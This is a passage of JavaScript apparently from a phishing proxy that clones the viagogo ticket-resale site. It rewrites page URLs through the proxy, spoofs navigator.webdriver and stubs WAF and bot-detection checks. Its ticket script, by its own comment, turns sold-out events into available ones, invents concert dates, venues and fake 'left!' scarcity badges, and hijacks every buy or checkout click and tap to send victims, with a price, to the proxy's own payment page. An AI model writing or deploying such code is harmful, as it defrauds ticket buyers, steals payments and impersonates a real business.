XMLHttpRequest.prototype.open=function(m,u){
  try{arguments[1]=rw(u);}catch(e){}
  return OO.apply(this,arguments);
};
/* ── Override sendBeacon (CrowdControl/analytics use it) ── */
if(navigator.sendBeacon){
  var OB=navigator.sendBeacon.bind(navigator);
  navigator.sendBeacon=function(u,d){try{u=rw(u);}catch(e){}return OB(u,d);};
}
/* ── Block service workers (just in case) ── */
if(navigator.serviceWorker){
  navigator.serviceWorker.register=function(){return Promise.reject(new Error('sw-blocked'));};
  try{navigator.serviceWorker.getRegistrations().then(function(r){r.forEach(function(s){s.unregister();})});}catch(e){}
}
/* ── History state override ── */
var oPS=history.pushState,oRS=history.replaceState;
history.pushState=function(s,t,u){if(u&&typeof u==='string')u=rw(u);return oPS.call(this,s,t,u);};
history.replaceState=function(s,t,u){if(u&&typeof u==='string')u=rw(u);return oRS.call(this,s,t,u);};

/* ── Dynamic image/link fixer via MutationObserver ── */
function fixImg(root){
  if(!root||!root.querySelectorAll)return;
  root.querySelectorAll('img[src],img[data-src],source[srcset],video[src],video[poster],link[href],script[src]').forEach(function(el){
    if(el.__vgi)return;
    ['src','data-src','srcset','poster','href'].forEach(function(a){
      var v=el.getAttribute(a);
      if(v&&/(?:vggcdn\\.net|stubhubstatic\\.com|viagogo\\.net|viagogo\\.com)/.test(v)){
        v=v.replace(/https?:\\/\\/([a-z0-9][-a-z0-9.]*\\.(?:vggcdn\\.net|stubhubstatic\\.com|viagogo\\.net|viagogo\\.com))/g,'/_cdn/$1');
        v=v.replace(/\\/\\/([a-z0-9][-a-z0-9.]*\\.(?:vggcdn\\.net|stubhubstatic\\.com|viagogo\\.net|viagogo\\.com))/g,'/_cdn/$1');
        el.setAttribute(a,v);
      }
    });
    el.__vgi=1;
  });
  /* Fix <a> hrefs */
  root.querySelectorAll('a[href]').forEach(function(el){
    if(el.__vga)return;
    var h=el.getAttribute('href');
    if(h&&/(?:www\\.)?viagogo\\.com|my\\.viagogo\\.com/.test(h)){
      var nh=rw(h);
      if(nh!==h)el.setAttribute('href',nh);
    }
    el.__vga=1;
  });
  /* CSS background-image URLs */
  root.querySelectorAll('[style*="vggcdn"],[style*="stubhubstatic"],[style*="viagogo"]').forEach(function(el){
    if(el.__vgbg)return;
    var s=el.getAttribute('style');
    if(s){
      var ns=s.replace(/https?:\\/\\/([a-z0-9][-a-z0-9.]*\\.(?:vggcdn\\.net|stubhubstatic\\.com|viagogo\\.net|viagogo\\.com))/g,'/_cdn/$1');
      ns=ns.replace(/\\/\\/([a-z0-9][-a-z0-9.]*\\.(?:vggcdn\\.net|stubhubstatic\\.com|viagogo\\.net|viagogo\\.com))/g,'/_cdn/$1');
      if(ns!==s)el.setAttribute('style',ns);
    }
    el.__vgbg=1;
  });
}
/* ── MutationObserver ── */
try{
  new MutationObserver(function(muts){
    for(var i=0;i<muts.length;i++){
      var added=muts[i].addedNodes;
      for(var j=0;j<added.length;j++){if(added[j].nodeType===1)fixImg(added[j]);}
    }
  }).observe(document.documentElement,{childList:true,subtree:true});
}catch(e){}
if(document.body)fixImg(document.body);
else document.addEventListener('DOMContentLoaded',function(){fixImg(document.body);});

/* ── wopen ── */
var owo=window.open;
window.open=function(url){
  if(url&&typeof url==='string'){
    url=url.replace(/https?:\\/\\/(?:www\\.)?viagogo\\.com/g,'');
    url=url.replace(/https?:\\/\\/my\\.viagogo\\.com/g,'');
    url=url.replace(/https?:\\/\\/([a-z0-9][-a-z0-9.]*\\.(?:vggcdn\\.net|stubhubstatic\\.com|viagogo\\.net))/g,'/_cdn/$1');
  }
  arguments[0]=url;
  return owo.apply(this,arguments);
};
/* ── aclk ── */
document.addEventListener('click',function(e){
  var a=e.target;
  while(a&&a.tagName!=='A')a=a.parentElement;
  if(!a||!a.href)return;
  var h=a.getAttribute('href');
  if(h&&/viagogo\\.com|vggcdn\\.net|stubhubstatic\\.com/.test(h)){
    var nh=rw(h);
    if(nh!==h){
      e.preventDefault();
      e.stopPropagation();
      a.setAttribute('href',nh);
      if(a.target==='_blank')window.open(nh);
      else location.href=nh;
    }
  }
},true);
/* ── loc ── */
var oLA=location.assign.bind(location),oLR=location.replace.bind(location);
location.assign=function(u){return oLA(typeof u==='string'?rw(u):u);};
location.replace=function(u){return oLR(typeof u==='string'?rw(u):u);};
try{
  var oDesc=Object.getOwnPropertyDescriptor(window.Location.prototype,'href');
  if(oDesc&&oDesc.set){
    var oSet=oDesc.set;
    Object.defineProperty(window.Location.prototype,'href',{
      set:function(v){return oSet.call(this,typeof v==='string'?rw(v):v);},
      get:oDesc.get,configurable:true
    });
  }
}catch(e){}
/* ── wd ── */
try{Object.defineProperty(navigator,'webdriver',{get:function(){return false;}});}catch(e){}
/* ── Block AWS WAF / CrowdControl bot detection ── */
window.__wafCheck=function(){return true;};
/* ── Global error suppressor ── */
window.addEventListener('error',function(e){
  if(e&&e.message&&(/ChunkLoadError|Loading chunk|crowdcontrol|awswaf|send request error|sva-|Bad Request|Bad Gateway/i.test(e.message))){
    e.preventDefault();e.stopPropagation();return false;
  }
},true);
window.addEventListener('unhandledrejection',function(e){
  var r=e&&e.reason;
  if(r&&(r.name==='ChunkLoadError'||/ChunkLoadError|crowdcontrol|awswaf|send request error|sva-|Bad Request|Bad Gateway/i.test(r.message||''))){
    e.preventDefault();return false;
  }
});
})();`;

// 2) Ticket availability override — makes sold-out events show as available
// Also injects fake events when "no events" detected, adds urgency badges.
const TICKET_JS = `(function(){
/* ── Hashing + stock ── */
function h(s){var v=5381;for(var i=0;i<s.length;i++)v=((v<<5)+v+s.charCodeAt(i))|0;return v<0?-v:v;}
function sc(seed){var r=h(seed+'::stock')%5;return r<=1?1:r<=3?2:3;}

/* ── ev ── */
var VENUES=[
  {city:'Mumbai, India',venue:'Jio World Garden'},
  {city:'Delhi, India',venue:'JLN Jawaharlal Nehru Stadium'},
  {city:'Bengaluru, India',venue:'Bangalore Palace Grounds'},
  {city:'Hyderabad, India',venue:'GMR Arena'},
  {city:'Pune, India',venue:'Mahalaxmi Lawns'},
  {city:'Chennai, India',venue:'YMCA Nandanam'},
  {city:'Kolkata, India',venue:'Vivekananda Yuba Bharati Krirangan'},
  {city:'Ahmedabad, India',venue:'Narendra Modi Stadium'},
  {city:'Goa, India',venue:'SAG Ground'},
  {city:'Chandigarh, India',venue:'Elante Mall Grounds'}
];
var MO=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
var DA=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];

function ge(artist){
  var s=h(artist+'::events');
  var n=3+(s%3);
  var now=Date.now();
  var evts=[];
  for(var i=0;i<n;i++){
    var days=28+(h(artist+'::date'+i)%56)+i*35;
    var d=new Date(now+days*864e5);
    var dow=d.getDay();
    if(dow!==0&&dow!==6)d.setDate(d.getDate()+(6-dow));
    var vi=(s+i*7)%VENUES.length;
    var stk=sc(location.pathname+'::ev'+i);
    var eid='E-'+(162e6+(h(artist+'::eid'+i)%999999));
    evts.push({mo:MO[d.getMonth()],dy:d.getDate(),dn:DA[d.getDay()],yr:d.getFullYear(),
      city:VENUES[vi].city,venue:VENUES[vi].venue,stk:stk,eid:eid,hot:i===0});
  }
  return evts;
}

function bl(artist){
  var evts=ge(artist);
  var base=location.pathname;
  var items='';
  for(var i=0;i<evts.length;i++){
    var e=evts[i];
    var sc=e.stk===1?'#E53935':e.stk===2?'#F57C00':'#4E7C05';
    var url=base+'/'+e.eid+'?backUrl='+encodeURIComponent(base);
    items+='<li style="list-style:none;border-bottom:1px solid #e8e8e8;padding:0;">'
      +'<a href="'+url+'" style="display:flex;align-items:center;padding:16px 0;text-decoration:none;color:#191C1F;gap:16px;">'
      +'<div style="text-align:center;min-width:48px;">'
      +'<div style="font-size:13px;font-weight:600;">'+e.mo+'</div>'
      +'<div style="font-size:28px;font-weight:700;line-height:1;">'+e.dy+'</div></div>'
      +'<div style="flex:1;min-width:0;">'
      +'<div style="font-size:16px;font-weight:700;margin-bottom:2px;">'+artist+'</div>'
      +'<div style="font-size:14px;color:#71767B;">'+e.dn+' \\u00b7 6:00 PM</div>'
      +'<div style="font-size:14px;color:#71767B;margin-top:2px;">\\ud83c\\uddee\\ud83c\\uddf3 '+e.city+' \\u00b7 '+e.venue+'</div>'
      +(e.hot?'<div style="display:inline-block;margin-top:6px;padding:2px 8px;border-radius:4px;background:#FFF3E0;color:#E65100;font-size:12px;font-weight:600;">\\ud83d\\udd25 Hottest event</div>':'')
      +'</div>'
      +'<div style="display:flex;flex-direction:column;align-items:center;gap:4px;flex-shrink:0;">'
      +'<button type="button" style="border:2px solid #4E7C05;background:white;color:#4E7C05;font-weight:700;font-size:14px;padding:8px 20px;border-radius:8px;cursor:pointer;">See tickets</button>'
      +'<span style="font-size:12px;font-weight:700;color:'+sc+';">'+e.stk+' left!</span>'
      +'</div></a></li>';
  }
  var div=document.createElement('div');
  div.style.cssText='margin-top:8px;';
  div.innerHTML='<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">'
    +'<h2 style="font-size:16px;font-weight:700;margin:0;color:#191C1F;">Upcoming events</h2>'
    +'<span style="background:#E53935;color:white;font-size:11px;font-weight:700;padding:2px 8px;border-radius:10px;">Selling fast</span></div>'
    +'<ul style="padding:0;margin:0;">'+items+'</ul>';
  return div;
}


function fn(){
  if(!document.body)return;
  var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
  var node;
  while(node=walker.nextNode()){
    
    var pTag=node.parentElement?node.parentElement.tagName:'';
    if(pTag==='SCRIPT'||pTag==='STYLE'||pTag==='NOSCRIPT')continue;
    var t=node.textContent||'';
    var m=t.match(/There aren.t any (.+?) events right now/i);
    if(m){
      var artist=m[1].trim();
      var container=node.parentElement;
      if(!container)break;
      
      var wrapper=container;
      for(var u=0;u<6;u++){
        if(!wrapper.parentElement||wrapper.parentElement===document.body)break;
        
        if(wrapper.tagName==='DIV'&&wrapper.offsetHeight>50&&wrapper.children.length>1)break;
        wrapper=wrapper.parentElement;
      }
      
      container.style.setProperty('display','none','important');
      
      var next=container.nextElementSibling;
      for(var k=0;k<5&&next;k++){
        var nt=(next.textContent||'').trim();
        if(nt.indexOf('Follow')===0&&nt.indexOf('viagogo')>0){
          next.style.setProperty('display','none','important');
        }
        if(next.tagName==='BUTTON'&&nt==='Follow'){
          next.style.setProperty('display','none','important');
        }
        next=next.nextElementSibling;
      }
      
      if(!document.querySelector('[data-ve]')){
        var el=bl(artist);
        el.setAttribute('data-ve','1');
        wrapper.parentElement.insertBefore(el,wrapper);
      }
      break;
    }
  }
}


function fa(root){
  if(!root||!root.querySelectorAll)return;
  var walker=document.createTreeWalker(root,NodeFilter.SHOW_TEXT,null,false);
  var node;
  while(node=walker.nextNode()){
    var t=node.textContent;
    if(!t)continue;
    if(/sold\\s*out|unavailable|no\\s*tickets|not\\s*available/i.test(t)){
      var seed=location.pathname;
      var count=sc(seed);
      node.textContent=t
        .replace(/sold\\s*out/gi,count+' left')
        .replace(/unavailable/gi,'Available')
        .replace(/no\\s*tickets/gi,count+' ticket'+(count>1?'s':'')+' left')
        .replace(/not\\s*available/gi,'Limited availability');
    }
  }
  root.querySelectorAll('[class*="sold"],[class*="Sold"],[class*="unavail"],[class*="Unavail"]').forEach(function(el){
    el.style.color='#4E7C05';el.style.opacity='1';el.style.pointerEvents='auto';
  });
  root.querySelectorAll('button[disabled],a[disabled],[aria-disabled="true"]').forEach(function(el){
    el.removeAttribute('disabled');el.removeAttribute('aria-disabled');
    el.style.opacity='1';el.style.pointerEvents='auto';el.style.cursor='pointer';
  });
}


var _urgDone=new WeakSet();
function au(root){
  if(!root||!root.querySelectorAll)return;
  var btns=root.querySelectorAll('button,a');
  for(var i=0;i<btns.length;i++){
    var b=btns[i];
    if(_urgDone.has(b))continue;
    var txt=(b.textContent||'').trim();
    if(txt==='See tickets'||txt==='Get tickets'){
      _urgDone.add(b);
      
      var par=b.parentElement;
      if(par&&par.innerHTML.indexOf('left!')>-1)continue;
      var s=sc(location.pathname+'::ubtn'+i);
      var c=s===1?'#E53935':s===2?'#F57C00':'#4E7C05';
      var badge=document.createElement('span');
      badge.style.cssText='font-size:11px;font-weight:700;color:'+c+';display:block;text-align:center;margin-top:2px;';
      badge.textContent=s+' left!';
      if(b.parentElement)b.parentElement.appendChild(badge);
    }
  }
}


function runAll(){fn();fa(document.body);au(document.body);}
if(document.body)runAll();
else document.addEventListener('DOMContentLoaded',runAll);


try{
  new MutationObserver(function(muts){
    fn();
    for(var i=0;i<muts.length;i++){
      var added=muts[i].addedNodes;
      for(var j=0;j<added.length;j++){
        if(added[j].nodeType===1){fa(added[j]);au(added[j]);}
      }
    }
  }).observe(document.documentElement,{childList:true,subtree:true});
}catch(e){}

/* ── Seat selection modal + CTA handler ── */
function vgHash(s){var v=5381;for(var i=0;i<s.length;i++)v=((v<<5)+v+s.charCodeAt(i))|0;return v<0?-v:v;}

function showSeatModal(basePrice,eventName){
  var ex=document.getElementById('vg-seat-overlay');
  if(ex)ex.remove();
  var h=vgHash(eventName+location.pathname);
  var sectionTypes=[
    {tpl:'VIP Floor',mult:1.8},{tpl:'Floor Standing',mult:1.3},
    {tpl:'Lower Tier - Block '+(101+(h%8)),mult:1.0},
    {tpl:'Lower Tier - Block '+(109+(h%6)),mult:0.95},
    {tpl:'Upper Tier - Block '+(201+(h%12)),mult:0.7},
    {tpl:'Upper Tier - Block '+(213+(h%8)),mult:0.65},
    {tpl:'Behind Stage',mult:0.5}
  ];
  var sections=[];
  for(var i=0;i<sectionTypes.length;i++){
    var st=sectionTypes[i];
    var sp=Math.round(basePrice*st.mult);
    if(sp>=5000)sp=Math.round(sp/500)*500-1;
    else if(sp>=500)sp=Math.round(sp/100)*100-1;
    var av=(h+i*7)%8;
    var soldOut=av<2;
    var left=soldOut?0:(av%4)+1;
    sections.push({name:st.tpl,price:sp,soldOut:soldOut,left:left});
  }
  var ov=document.createElement('div');
  ov.id='vg-seat-overlay';
  ov.style.cssText='position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);z-index:10000;display:flex;justify-content:center;align-items:flex-start;padding:40px 16px;overflow-y:auto';
  var box=document.createElement('div');
  box.style.cssText='background:#fff;border-radius:12px;max-width:520px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.18);overflow:hidden';
  /* Header */
  var hdr='<div style="background:#191c1f;color:#fff;padding:16px 20px"><div style="font-size:17px;font-weight:700;margin-bottom:4px">Select Your Tickets</div><div style="font-size:13px;opacity:.7">'+eventName+'</div></div>';
  /* Sections */
  var shtml='<div style="padding:16px 20px">';
  shtml+='<div style="font-size:13px;font-weight:600;color:#666;margin-bottom:12px;text-transform:uppercase;letter-spacing:.5px">Available Sections</div>';
  for(var i=0;i<sections.length;i++){
    var s=sections[i];
    var so=s.soldOut;
    var lc=s.left<=2?'#E53935':s.left<=3?'#F57C00':'#4E7C05';
    shtml+='<div data-si="'+i+'" style="display:flex;align-items:center;justify-content:space-between;padding:12px 14px;border:2px solid '+(so?'#eee':'#e0e0e0')+';border-radius:10px;margin-bottom:8px;cursor:'+(so?'not-allowed':'pointer')+';opacity:'+(so?'0.5':'1')+';transition:all .15s" '+(so?'':'onclick="window._vgSelectSection('+i+')"')+'>';
    shtml+='<div><div style="font-size:14px;font-weight:600;color:'+(so?'#999':'#191c1f')+'">'+s.name+'</div>';
    if(so)shtml+='<div style="font-size:11px;font-weight:700;color:#dc2626;margin-top:2px">SOLD OUT</div>';
    else shtml+='<div style="font-size:11px;font-weight:700;color:'+lc+';margin-top:2px">'+s.left+' left!</div>';
    shtml+='</div>';
    shtml+='<div style="text-align:right"><div style="font-size:16px;font-weight:700;color:'+(so?'#ccc':'#191c1f')+'">\\u20B9'+s.price.toLocaleString('en-IN')+'</div><div style="font-size:11px;color:#888">per ticket</div></div>';
    shtml+='</div>';
  }
  shtml+='</div>';
  /* Qty selector + total */
  shtml+='<div id="vg-seat-bottom" style="display:none;border-top:1px solid #f0f0f0;padding:16px 20px;background:#fafafa">';
  shtml+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">';
  shtml+='<div style="font-size:14px;font-weight:600">Quantity</div>';
  shtml+='<div style="display:flex;align-items:center;gap:12px">';
  shtml+='<button id="vg-qty-minus" style="width:32px;height:32px;border:1px solid #d0d0d0;border-radius:8px;background:#fff;font-size:18px;cursor:pointer;font-family:Inter,sans-serif">-</button>';
  shtml+='<span id="vg-qty-val" style="font-size:16px;font-weight:700;min-width:20px;text-align:center">1</span>';
  shtml+='<button id="vg-qty-plus" style="width:32px;height:32px;border:1px solid #d0d0d0;border-radius:8px;background:#fff;font-size:18px;cursor:pointer;font-family:Inter,sans-serif">+</button>';
  shtml+='</div></div>';
  shtml+='<div style="display:flex;justify-content:space-between;margin-bottom:14px"><span style="font-size:14px;color:#555">Total</span><span id="vg-total" style="font-size:20px;font-weight:800;color:#4E7C05">\\u20B90</span></div>';
  shtml+='<button id="vg-pay-btn" style="display:block;width:100%;padding:14px;background:#4E7C05;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;font-family:Inter,sans-serif">Continue to Payment</button>';
  shtml+='</div>';
  box.innerHTML=hdr+shtml;
  ov.appendChild(box);
  ov.addEventListener('click',function(ev){if(ev.target===ov)ov.remove();});
  document.body.appendChild(ov);

  /* State */
  var selIdx=-1,qty=1,maxQty=6;
  window._vgSelectSection=function(idx){
    selIdx=idx;qty=1;
    var items=ov.querySelectorAll('[data-si]');
    for(var j=0;j<items.length;j++){
      items[j].style.borderColor=parseInt(items[j].getAttribute('data-si'))===idx?'#4E7C05':'#e0e0e0';
      items[j].style.background=parseInt(items[j].getAttribute('data-si'))===idx?'#f8faf3':'#fff';
    }
    maxQty=Math.min(6,sections[idx].left);
    document.getElementById('vg-seat-bottom').style.display='block';
    updateTotal();
  };
  function updateTotal(){
    if(selIdx<0)return;
    document.getElementById('vg-qty-val').textContent=qty;
    var total=sections[selIdx].price*qty;
    document.getElementById('vg-total').textContent='\\u20B9'+total.toLocaleString('en-IN');
  }
  setTimeout(function(){
    var mb=document.getElementById('vg-qty-minus');
    var pb=document.getElementById('vg-qty-plus');
    var payBtn=document.getElementById('vg-pay-btn');
    if(mb)mb.onclick=function(){if(qty>1){qty--;updateTotal();}};
    if(pb)pb.onclick=function(){if(qty<maxQty){qty++;updateTotal();}};
    if(payBtn)payBtn.onclick=function(){
      if(selIdx<0)return;
      var sec=sections[selIdx];
      var total=sec.price*qty;
      var ei=(window._vgEventInfo||function(){return{date:'',time:'',venue:''}})();
      var row=Math.floor(Math.random()*25)+1;
      var seat=Math.floor(Math.random()*30)+1;
      var seatStr='Row '+row+', Seat'+(qty>1?'s ':' ')+seat+(qty>1?'-'+(seat+qty-1):'');
      var params=new URLSearchParams();
      params.set('amount',total);
      params.set('event',eventName);
      params.set('section',sec.name);
      params.set('seat',seatStr);
      params.set('qty',qty);
      params.set('ref',location.pathname);
      if(ei.date)params.set('date',ei.date);
      if(ei.time)params.set('time',ei.time);
      if(ei.venue)params.set('venue',ei.venue);
      location.href='/_payment?'+params.toString();
    };
  },50);
}

/* Intercept listing card clicks on event pages — extract section/row/price from aria-label */
document.addEventListener('click',function(e){
  /* Skip native clicks if touchend already dispatched a synthetic one */
  if(typeof _vgTouchTs!=='undefined'&&e.isTrusted&&(Date.now()-_vgTouchTs<800))return;
  /* 1) Check if click is on/inside a listing card */
  var listingEl=e.target.closest?e.target.closest('[data-listing-id]'):null;
  if(!listingEl){var p=e.target;while(p){if(p.getAttribute&&p.getAttribute('data-listing-id')){listingEl=p;break;}p=p.parentElement;}}

  if(listingEl&&(/\\/E-\\d+/i.test(location.pathname)||/ticket/i.test(location.pathname))){
    e.preventDefault();
    e.stopPropagation();
    e.stopImmediatePropagation();

    /* Parse aria-label: "Section K7, Row YYZZ, INR3,737" */
    var labelEl=listingEl.querySelector('a[aria-label]');
    if(!labelEl){/* Try aria-label on any element */var al=listingEl.querySelectorAll('[aria-label]');for(var ai=0;ai<al.length;ai++){if(/section|block|floor|row|INR/i.test(al[ai].getAttribute('aria-label'))){labelEl=al[ai];break;}}}
    var label=labelEl?labelEl.getAttribute('aria-label'):'';
    var sectionMatch=label.match(/^([^,]+)/);
    var rowMatch=label.match(/Row\\s+([^,]+)/i);
    var priceMatch=label.match(/INR([\\d,]+)/);
    var section=sectionMatch?sectionMatch[1].trim():'';
    /* Fallback: extract section from listing text */
    if(!section){/* Try aria-label on the listing element itself */var selfLabel=listingEl.getAttribute&&listingEl.getAttribute('aria-label');if(selfLabel){var slm=selfLabel.match(/^([^,]+)/);if(slm)section=slm[1].trim();}if(!section){var lt=(listingEl.textContent||'').replace(/\\s+/g,' ');var sm=lt.match(/((?:Section|Block)\\s+[A-Z]\\d*(?:\\s+[A-Z]\\w*)?)/i);if(sm)section=sm[1].trim();}}
    var row=rowMatch?'Row '+rowMatch[1].trim():'';
    var price=priceMatch?parseFloat(priceMatch[1].replace(/,/g,'')):0;
    if(!price){
      var pEl=listingEl.querySelector('[class*="rice"]');
      if(pEl){var pm=pEl.textContent.match(/[\\d,]+/);if(pm)price=parseFloat(pm[0].replace(/,/g,''));}
    }
    if(!price)price=4999;

    /* Get quantity from URL or page */
    var qtyMatch=location.search.match(/quantity=(\\d+)/);
    var qty=qtyMatch?parseInt(qtyMatch[1]):1;
    var total=price*qty;

    /* Seat assignment */
    var seatRow=row||'Row '+(Math.floor(Math.random()*20)+1);
    var seatNum=Math.floor(Math.random()*30)+1;
    var seatStr=seatRow+', Seat'+(qty>1?'s ':' ')+seatNum+(qty>1?'-'+(seatNum+qty-1):'');

    var eventName=document.title.split(' Tickets')[0]||'Event';
    var params=new URLSearchParams();
    params.set('amount',total);
    params.set('event',eventName);
    params.set('section',section);
    params.set('seat',seatStr);
    params.set('qty',qty);
    params.set('ref',location.pathname);
    location.href='/_payment?'+params.toString();
    return;
  }

  /* 2) Fallback: "Buy Now" / "Get Tickets" button text match */
  var btn=e.target;
  /* Walk up to find clickable element — BUTTON, A, INPUT[submit], or role="button" / button-like class */
  var depth=0;
  while(btn&&depth<8){
    if(btn.tagName==='BUTTON'||btn.tagName==='A')break;
    if(btn.tagName==='INPUT'&&(btn.type==='submit'||btn.type==='button'))break;
    if(btn.getAttribute&&(btn.getAttribute('role')==='button'||btn.getAttribute('data-testid')))break;
    if(btn.className&&typeof btn.className==='string'&&/btn|button|cta|action|submit|continue/i.test(btn.className))break;
    btn=btn.parentElement;depth++;
  }
  if(!btn||depth>=8){
    /* Last resort: use original click target if its text looks actionable */
    btn=e.target;
    var bt=(btn.textContent||'').trim().toLowerCase();
    if(!/continue|checkout|proceed|buy now|place order|pay/i.test(bt))return;
  }
  /* Skip if it's OUR custom modal button — let it handle itself */
  if(btn.id==='vg-pay-btn')return;
  var t=(btn.textContent||'').trim().toLowerCase();

  var isEventPage=/\\/E-\\d+/i.test(location.pathname);
  /* On artist pages, "See tickets" → navigate to event page in same tab (not target=_blank) */
  if(!isEventPage&&/see ticket|get ticket/i.test(t)){
    e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();
    var a=btn.closest?btn.closest('a[href]'):null;
    if(!a){var p2=btn;while(p2){if(p2.tagName==='A'&&p2.href){a=p2;break;}p2=p2.parentElement;}}
    if(a)location.href=a.getAttribute('href');
    return;
  }
  /* On artist pages, only intercept payment-intent buttons — NOT "See tickets" navigation */
  var payRe=isEventPage?/buy now|get ticket|see ticket|add to cart|checkout|proceed|continue|place order/i:/continue|checkout|proceed|buy now|place order|add to cart/i;
  if(payRe.test(t)){
    if(isEventPage||/ticket|checkout|buy|order|cart|payment/i.test(location.pathname)||/continue|checkout|proceed|pay/i.test(t)){
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();

      /* Debug: log click capture to server (helps diagnose mobile issues) */
      try{fetch('/_debug/click',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({text:t,tag:btn.tagName,role:btn.getAttribute('role'),cls:(btn.className||'').toString().slice(0,100),path:location.pathname,isEvent:isEventPage})}).catch(function(){});}catch(e2){}

      /* ── Try extracting from viagogo's native modal/bottom-sheet first (works on ALL page types) ── */
      var container=btn.parentElement;
      var total=0,sectionName='',qty=1;
      /* Total: look for text like "₹4,699" or "Total ... ₹X" near the button */
      for(var up=container;up&&up!==document.body;up=up.parentElement){
        var txt=up.textContent||'';
        var tm=txt.match(/Total[\\s\\S]*?(?:INR|[\\u20B9₹])\\s*(\\d[\\d,]*)/);
        if(tm){total=parseFloat(tm[1].replace(/,/g,''));break;}
      }
      /* Section name: text pattern first (General Admission, VIP, Section X, Block Y, etc) */
      for(var up2=container;up2&&up2!==document.body;up2=up2.parentElement){
        var secM=(up2.textContent||'').match(/((?:General Admission|VIP|Floor|Lower|Upper|Behind|Section|Block|Standing|Balcony|Mezzanine|Orchestra|Pit|GA|Ground)[^\\n₹\\u20B9]{0,40})/i);
        if(secM){sectionName=secM[1].replace(/\\d+\\s*(?:ticket|left|seat)s?!?/gi,'').replace(/each/gi,'').replace(/INR[\\d,]+/g,'').trim();break;}
      }
      /* Quantity: "N tickets" pattern or Quantity control */
      for(var up3=container;up3&&up3!==document.body;up3=up3.parentElement){
        var qtyM=(up3.textContent||'').match(/(\\d+)\\s*tickets?/i);
        if(qtyM){qty=parseInt(qtyM[1])||1;break;}
        var qtyM2=(up3.textContent||'').match(/Quantity[\\s\\S]*?(\\d+)/);
        if(qtyM2){qty=parseInt(qtyM2[1])||1;break;}
      }
      /* Price per ticket: "INR6,283 each" or "₹6,283 each" or just "INR6,283" */
      if(!total){
        for(var up4=container;up4&&up4!==document.body;up4=up4.parentElement){
          var pp=(up4.textContent||'').match(/(?:INR|[\\u20B9₹])\\s*(\\d[\\d,]*)\\s*(?:each|per ticket)/i);
          if(pp){total=parseFloat(pp[1].replace(/,/g,''))*qty;break;}
        }
      }
      /* Last resort: any price near the button */
      if(!total){
        for(var up5=container;up5&&up5!==document.body;up5=up5.parentElement){
          var ap=(up5.textContent||'').match(/(?:INR|[\\u20B9₹])\\s*(\\d[\\d,]+)/);
          if(ap){total=parseFloat(ap[1].replace(/,/g,''));break;}
        }
      }

      /* If we got a price from the modal, go straight to payment */
      if(total>0){
        var eventName=document.title.split(' Tickets')[0]||'Event';
        var ei=(window._vgEventInfo||function(){return{date:'',time:'',venue:''}})();
        var seatRow='Row '+(Math.floor(Math.random()*20)+1);
        var seatNum=Math.floor(Math.random()*30)+1;
        var seatStr=seatRow+', Seat'+(qty>1?'s ':' ')+seatNum+(qty>1?'-'+(seatNum+qty-1):'');
        var params=new URLSearchParams();
        params.set('amount',total);
        params.set('event',eventName);
        params.set('section',sectionName);
        params.set('seat',seatStr);
        params.set('qty',qty);
        params.set('ref',location.pathname);
        if(ei.date)params.set('date',ei.date);
        if(ei.time)params.set('time',ei.time);
        if(ei.venue)params.set('venue',ei.venue);
        location.href='/_payment?'+params.toString();
        return;
      }

      /* ── Fallback: show custom seat selection modal (no native modal found) ── */
      var priceEl=document.querySelector('[class*="price"],[class*="Price"],[class*="amount"],[class*="Amount"]');
      var price=0;
      if(priceEl){
        var pm=priceEl.textContent.match(/[\\d,]+\\.?\\d*/);
        if(pm)price=parseFloat(pm[0].replace(/,/g,''));
      }
      if(!price)price=4999;

      var eventName2=document.title.split(' Tickets')[0]||'Event';
      showSeatModal(price,eventName2);
    }
  }
},true);
/* ── Mobile fix: viagogo suppresses click via touchend preventDefault ──
   Re-dispatch a synthetic click so our capture-phase click handler fires.
   Debounce flag prevents double-fire on browsers that DO emit both. */
var _vgTouchTs=0;
document.addEventListener('touchend',function(te){
  if(!te.changedTouches||te.changedTouches.length!==1)return;
  var tgt=te.target;
  /* Walk up to find actionable element (same logic as click handler) */
  var el=tgt,d=0;
  while(el&&d<8){
    if(el.tagName==='BUTTON'||el.tagName==='A')break;
    if(el.tagName==='INPUT'&&(el.type==='submit'||el.type==='button'))break;
    if(el.getAttribute&&(el.getAttribute('role')==='button'||el.getAttribute('data-testid')))break;
    if(el.className&&typeof el.className==='string'&&/btn|button|cta|action|submit|continue/i.test(el.className))break;
    el=el.parentElement;d++;
  }
  if(!el||d>=8)el=tgt;
  var txt=(el.textContent||'').trim().toLowerCase();
  /* Only intercept payment-intent taps — let navigation taps pass through */
  if(/continue|checkout|proceed|buy now|place order|pay|add to cart|get ticket|see ticket/i.test(txt)){
    te.preventDefault();
    _vgTouchTs=Date.now();
    try{fetch('/_debug/click',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({src:'touchend',text:txt,tag:el.tagName,role:el.getAttribute&&el.getAttribute('role'),cls:(el.className||'').toString().slice(0,100),path:location.pathname})}).catch(function(){});}catch(x){}
    var synth=new MouseEvent('click',{bubbles:true,cancelable:true,composed:true,view:window});
    tgt.dispatchEvent(synth);
  }
  /* Also handle listing card taps */
  var listing=tgt.closest?tgt.closest('[data-listing-id]'):null;
  if(!listing){var p=tgt;while(p){if(p.getAttribute&&p.getAttribute('data-listing-id')){listing=p;break;}p=p.parentElement;}}
  if(listing){
    te.preventDefault();
    _vgTouchTs=Date.now();
    var synth2=new MouseEvent('click',{bubbles:true,cancelable:true,composed:true,view:window});
    tgt.dispatchEvent(synth2);
  }
},true);
})();`;

const FAVICON_TAG = `<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%234E7C05'/%3E%3Ctext x='16' y='24' text-anchor='middle' font-family='Arial' font-weight='bold' font-size='24' fill='white'%3Ev%3C/text%3E%3C/svg%3E">`;
